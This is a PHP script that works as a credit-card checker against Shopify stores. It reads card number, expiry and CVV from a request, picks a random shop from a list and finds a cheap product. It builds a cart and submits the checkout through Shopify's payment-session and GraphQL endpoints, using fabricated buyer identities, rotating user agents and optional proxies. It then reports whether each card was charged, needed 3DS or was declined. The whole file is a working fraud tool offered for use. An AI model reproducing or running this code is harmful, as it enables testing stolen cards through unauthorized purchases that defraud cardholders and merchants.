<?php
header('Content-Type: application/json');
error_reporting(0);
ini_set('display_errors', 0);

function json_response($price, $response) {
    echo json_encode(['Price' => $price, 'Response' => $response]);
    exit;
}

function find_between($string, $start, $end) {
    $pos_start = strpos($string, $start);
    if ($pos_start === false) return "";
    $pos_start += strlen($start);
    $pos_end = strpos($string, $end, $pos_start);
    if ($pos_end === false) return "";
    return substr($string, $pos_start, $pos_end - $pos_start);
}

function luhn_check($card_number) {
    $card_number = preg_replace('/\D/', '', $card_number);
    if (strlen($card_number) < 13 || strlen($card_number) > 19) return false;
    
    $sum = 0;
    $length = strlen($card_number);
    for ($i = 0; $i < $length; $i++) {
        $digit = intval($card_number[$length - $i - 1]);
        if ($i % 2 == 1) {
            $digit *= 2;
            if ($digit > 9) $digit -= 9;
        }
        $sum += $digit;
    }
    return ($sum % 10) == 0;
}

function parse_proxy($proxy_string) {
    $proxy_string = trim($proxy_string);
    if (strpos($proxy_string, '://') !== false) return $proxy_string;
    
    $parts = explode(':', $proxy_string);
    if (count($parts) == 2) {
        return "http://{$parts[0]}:{$parts[1]}";
    } elseif (count($parts) == 4) {
        if (strpos($proxy_string, '@') !== false) {
            list($auth, $location) = explode('@', $proxy_string);
            return "http://{$auth}@{$location}";
        } else {
            return "http://{$parts[2]}:{$parts[3]}@{$parts[0]}:{$parts[1]}";
        }
    }
    return null;
}

function generate_random_user_agent() {
    $agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15'
    ];
    return $agents[array_rand($agents)];
}

function get_random_info() {
    $locations = [
        ["city" => "New York", "state" => "New York", "state_short" => "NY", "street" => "Broadway", "zip" => "10001"],
        ["city" => "Los Angeles", "state" => "California", "state_short" => "CA", "street" => "Sunset Blvd", "zip" => "90001"],
        ["city" => "Chicago", "state" => "Illinois", "state_short" => "IL", "street" => "Michigan Ave", "zip" => "60601"],
        ["city" => "Houston", "state" => "Texas", "state_short" => "TX", "street" => "Main St", "zip" => "77001"],
        ["city" => "Phoenix", "state" => "Arizona", "state_short" => "AZ", "street" => "Central Ave", "zip" => "85001"],
        ["city" => "Miami", "state" => "Florida", "state_short" => "FL", "street" => "Biscayne Blvd", "zip" => "33101"]
    ];
    
    $first_names = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth"];
    $last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"];
    $email_domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"];
    
    $location = $locations[array_rand($locations)];
    $fname = $first_names[array_rand($first_names)];
    $lname = $last_names[array_rand($last_names)];
    
    $area_codes = [202, 212, 213, 310, 312, 415, 617, 702, 718, 917];
    $phone = $area_codes[array_rand($area_codes)] . rand(2000000, 9999999);
    
    return [
        "fname" => $fname,
        "lname" => $lname,
        "email" => strtolower($fname) . "." . strtolower($lname) . rand(100, 9999) . "@" . $email_domains[array_rand($email_domains)],
        "phone" => $phone,
        "add1" => rand(100, 9999) . " " . $location['street'],
        "city" => $location['city'],
        "state" => $location['state'],
        "state_short" => $location['state_short'],
        "zip" => $location['zip']
    ];
}

function curl_request($url, $headers = [], $post_data = null, $json = false, $proxy = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookies_' . uniqid() . '.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookies_' . uniqid() . '.txt');
    
    if ($proxy) curl_setopt($ch, CURLOPT_PROXY, $proxy);
    
    if (!empty($headers)) {
        $header_array = [];
        foreach ($headers as $key => $value) {
            $header_array[] = "$key: $value";
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header_array);
    }
    
    if ($post_data !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json ? json_encode($post_data) : http_build_query($post_data));
    }
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $final_url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close($ch);
    
    return ['body' => $response, 'code' => $http_code, 'url' => $final_url];
}

// Parse input
$cc_input = $_GET['cc'] ?? '';
$proxy_input = $_GET['proxy'] ?? '';

if (empty($cc_input)) {
    json_response('0.00', 'MISSING_CARD_PARAMETER');
}

$card_parts = explode('|', $cc_input);
if (count($card_parts) != 4) {
    json_response('0.00', 'INVALID_CARD_FORMAT');
}

list($cc, $mon, $year, $cvv) = $card_parts;

if (!luhn_check($cc)) {
    json_response('0.00', 'INVALID_CARD_NUM');
}

$proxy_url = null;
if (!empty($proxy_input)) {
    $proxy_url = parse_proxy($proxy_input);
}

// Load sites
if (!file_exists('shop.txt')) {
    json_response('0.00', 'SHOP_FILE_NOT_FOUND');
}

$sites = file('shop.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
if (empty($sites)) {
    json_response('0.00', 'NO_SITES_AVAILABLE');
}

$user_agent = generate_random_user_agent();
$product_header = [
    'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'accept-language' => 'en-US,en;q=0.6',
    'user-agent' => $user_agent
];

// Find suitable site
$site = null;
$selected_product = null;
$selected_variant = null;
$price = null;

for ($attempt = 0; $attempt < min(count($sites), 5); $attempt++) {
    $site = rtrim(trim($sites[array_rand($sites)]), '/');
    
    $product_response = curl_request($site . '/products.json', $product_header, null, false, $proxy_url);
    $products_data = json_decode($product_response['body'], true);
    
    if (!$products_data || !isset($products_data['products'])) continue;
    
    $lowest_price = PHP_FLOAT_MAX;
    foreach ($products_data['products'] as $product) {
        foreach ($product['variants'] as $variant) {
            $price_float = floatval($variant['price']);
            if ($price_float > 0 && $price_float < $lowest_price && $price_float <= 21) {
                $lowest_price = $price_float;
                $selected_product = $product;
                $selected_variant = $variant;
            }
        }
    }
    
    if ($selected_product) {
        $price = $selected_variant['price'];
        break;
    }
}

if (!$selected_product) {
    json_response('0.00', 'NO_SUITABLE_PRODUCT');
}

$product_id = $selected_product['id'];
$product_handle = $selected_product['handle'];
$variant_id = $selected_variant['id'];

// Initialize session
curl_request($site . "/products/{$product_handle}", $product_header, null, false, $proxy_url);
curl_request($site . '/cart.js', $product_header, null, false, $proxy_url);

// Add to cart
$add_data = ['id' => $variant_id, 'quantity' => '1', 'form_type' => 'product'];
$cart_add_response = curl_request($site . '/cart/add.js', $product_header, $add_data, false, $proxy_url);

if ($cart_add_response['code'] != 200) {
    json_response($price, 'CART_ADD_FAILED');
}

$cart_response = curl_request($site . '/cart.js', $product_header, null, false, $proxy_url);
$cart_data = json_decode($cart_response['body'], true);
$token = $cart_data['token'] ?? null;

if (!$token) {
    json_response($price, 'TOKEN_EXTRACTION_FAILED');
}

// Checkout
$checkout_headers = [
    'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'content-type' => 'application/x-www-form-urlencoded',
    'origin' => $site,
    'referer' => $site . '/cart',
    'user-agent' => $user_agent
];

curl_request($site . '/checkout', $checkout_headers, null, false, $proxy_url);
$checkout_response = curl_request($site . '/cart', $checkout_headers, ['checkout' => '', 'updates[]' => '1'], false, $proxy_url);

$response_text = $checkout_response['body'];
preg_match('/name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"/', $response_text, $matches);
$session_token = $matches[1] ?? null;

if (!$session_token) {
    json_response($price, 'SESSION_TOKEN_FAILED');
}

$queue_token = find_between($response_text, 'queueToken&quot;:&quot;', '&quot;');
$stable_id = find_between($response_text, 'stableId&quot;:&quot;', '&quot;');
$paymentMethodIdentifier = find_between($response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');

// Generate random info
$random_info = get_random_info();
$fname = $random_info['fname'];
$lname = $random_info['lname'];
$email = $random_info['email'];
$phone = $random_info['phone'];
$add1 = $random_info['add1'];
$city = $random_info['city'];
$state_short = $random_info['state_short'];
$zip_code = $random_info['zip'];

// Create payment session
$session_endpoints = [
    "https://deposit.us.shopifycs.com/sessions",
    "https://checkout.pci.shopifyinc.com/sessions",
    "https://checkout.shopifycs.com/sessions"
];

$sessionid = null;
foreach ($session_endpoints as $endpoint) {
    $parsed_url = parse_url($endpoint);
    $session_headers = [
        'authority' => $parsed_url['host'],
        'accept' => 'application/json',
        'content-type' => 'application/json',
        'origin' => 'https://checkout.shopifycs.com',
        'referer' => 'https://checkout.shopifycs.com/',
        'user-agent' => $user_agent
    ];
    
    $json_data = [
        'credit_card' => [
            'number' => $cc,
            'month' => $mon,
            'year' => $year,
            'verification_value' => $cvv,
            'name' => "$fname $lname"
        ],
        'payment_session_scope' => parse_url($site)['host']
    ];
    
    $session_response = curl_request($endpoint, $session_headers, $json_data, true, $proxy_url);
    
    if ($session_response['code'] == 200) {
        $session_data = json_decode($session_response['body'], true);
        if (isset($session_data['id'])) {
            $sessionid = $session_data['id'];
            break;
        }
    }
}

if (!$sessionid) {
    json_response($price, 'PAYMENT_SESSION_FAILED');
}

// Submit payment
$graphql_url = $site . "/checkouts/unstable/graphql";
$graphql_headers = [
    'authority' => parse_url($site)['host'],
    'accept' => 'application/json',
    'content-type' => 'application/json',
    'origin' => $site,
    'referer' => $site . '/',
    'user-agent' => $user_agent,
    'x-checkout-one-session-token' => $session_token,
    'x-checkout-web-source-id' => $token
];

$random_page_id = sprintf("%08x-%04X-%04X-%04X-%012X", rand(0x10000000, 0x99999999), rand(0x1000, 0x9999), rand(0x1000, 0x9999), rand(0x1000, 0x9999), rand(0x100000000000, 0x999999999999));

$graphql_payload = [
    'query' => 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
    'variables' => [
        'input' => [
            'sessionInput' => ['sessionToken' => $session_token],
            'queueToken' => $queue_token,
            'discounts' => ['lines' => [], 'acceptUnexpectedDiscounts' => true],
            'delivery' => [
                'deliveryLines' => [[
                    'selectedDeliveryStrategy' => [
                        'deliveryStrategyMatchingConditions' => ['estimatedTimeInTransit' => ['any' => true], 'shipments' => ['any' => true]],
                        'options' => new stdClass()
                    ],
                    'targetMerchandiseLines' => ['lines' => [['stableId' => $stable_id]]],
                    'destination' => ['streetAddress' => ['address1' => $add1, 'address2' => '', 'city' => $city, 'countryCode' => 'US', 'postalCode' => $zip_code, 'firstName' => $fname, 'lastName' => $lname, 'zoneCode' => $state_short, 'phone' => $phone]],
                    'deliveryMethodTypes' => ['SHIPPING'],
                    'expectedTotalPrice' => ['any' => true],
                    'destinationChanged' => true
                ]],
                'noDeliveryRequired' => [],
                'useProgressiveRates' => false
            ],
            'merchandise' => [
                'merchandiseLines' => [[
                    'stableId' => $stable_id,
                    'merchandise' => ['productVariantReference' => ['id' => "gid://shopify/ProductVariantMerchandise/$variant_id", 'variantId' => "gid://shopify/ProductVariant/$variant_id", 'properties' => []]],
                    'quantity' => ['items' => ['value' => 1]],
                    'expectedTotalPrice' => ['any' => true],
                    'lineComponents' => []
                ]]
            ],
            'payment' => [
                'totalAmount' => ['any' => true],
                'paymentLines' => [[
                    'paymentMethod' => ['directPaymentMethod' => ['paymentMethodIdentifier' => $paymentMethodIdentifier, 'sessionId' => $sessionid, 'billingAddress' => ['streetAddress' => ['address1' => $add1, 'city' => $city, 'countryCode' => 'US', 'postalCode' => $zip_code, 'firstName' => $fname, 'lastName' => $lname, 'zoneCode' => $state_short, 'phone' => $phone]]]],
                    'amount' => ['any' => true]
                ]],
                'billingAddress' => ['streetAddress' => ['address1' => $add1, 'city' => $city, 'countryCode' => 'US', 'postalCode' => $zip_code, 'firstName' => $fname, 'lastName' => $lname, 'zoneCode' => $state_short, 'phone' => $phone]]
            ],
            'buyerIdentity' => [
                'buyerIdentity' => ['presentmentCurrency' => 'USD', 'countryCode' => 'US'],
                'contactInfoV2' => ['emailOrSms' => ['value' => $email, 'emailOrSmsChanged' => false]]
            ],
            'tip' => ['tipLines' => []],
            'taxes' => ['proposedTotalAmount' => ['value' => ['amount' => '0', 'currencyCode' => 'USD']]]
        ],
        'attemptToken' => $token . '-' . mt_rand() / mt_getrandmax(),
        'metafields' => [],
        'analytics' => ['requestUrl' => $site . '/checkouts/cn/' . $token, 'pageId' => $random_page_id]
    ],
    'operationName' => 'SubmitForCompletion'
];

$receipt_id = null;

// Try up to 2 times for soft errors
for ($submit_attempt = 0; $submit_attempt < 2; $submit_attempt++) {
    $graphql_response = curl_request($graphql_url, $graphql_headers, $graphql_payload, true, $proxy_url);

    if ($graphql_response['code'] != 200) {
        if ($submit_attempt == 0) {
            sleep(2);
            continue;
        }
        json_response($price, 'GRAPHQL_REQUEST_FAILED');
    }

    $result_data = json_decode($graphql_response['body'], true);
    $completion = $result_data['data']['submitForCompletion'] ?? [];

    // Check errors
    if (isset($completion['errors'])) {
        $error_codes = array_column($completion['errors'], 'code');
        
        $decline_errors = ['PAYMENTS_CREDIT_CARD_GENERIC', 'PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT', 'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 'MERCHANDISE_OUT_OF_STOCK'];
        
        if (!empty(array_intersect($error_codes, $decline_errors))) {
            json_response($price, 'CARD_DECLINED');
        }
        
        // Check for soft errors
        $soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS'];
        $only_soft_errors = empty(array_diff($error_codes, $soft_errors));
        
        if ($only_soft_errors && $submit_attempt == 0) {
            sleep(2);
            continue;
        }
        
        if (!empty($error_codes)) {
            json_response($price, implode(',', $error_codes));
        }
    }

    if (isset($completion['reason'])) {
        json_response($price, $completion['reason']);
    }

    $receipt_id = $completion['receipt']['id'] ?? null;
    
    if ($receipt_id) {
        break;
    }
}

if (!$receipt_id) {
    json_response($price, 'NO_RECEIPT_ID');
}

// Poll receipt
$poll_payload = [
    'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}',
    'variables' => ['receiptId' => $receipt_id, 'sessionToken' => $session_token],
    'operationName' => 'PollForReceipt'
];

for ($poll_attempt = 0; $poll_attempt < 8; $poll_attempt++) {
    sleep(2);
    $poll_response = curl_request($graphql_url, $graphql_headers, $poll_payload, true, $proxy_url);
    
    if ($poll_response['code'] == 200) {
        $poll_data = json_decode($poll_response['body'], true);
        $receipt = $poll_data['data']['receipt'] ?? [];
        
        if (($receipt['__typename'] ?? '') == 'ProcessedReceipt' || isset($receipt['orderIdentity'])) {
            json_response($price, 'CHARGED');
        } elseif (($receipt['__typename'] ?? '') == 'ActionRequiredReceipt') {
            json_response($price, 'APPROVED_3DS');
        } elseif (($receipt['__typename'] ?? '') == 'FailedReceipt') {
            $error_code = $receipt['processingError']['code'] ?? 'UNKNOWN';
            json_response($price, $error_code);
        }
    }
}

json_response($price, 'TIMEOUT');
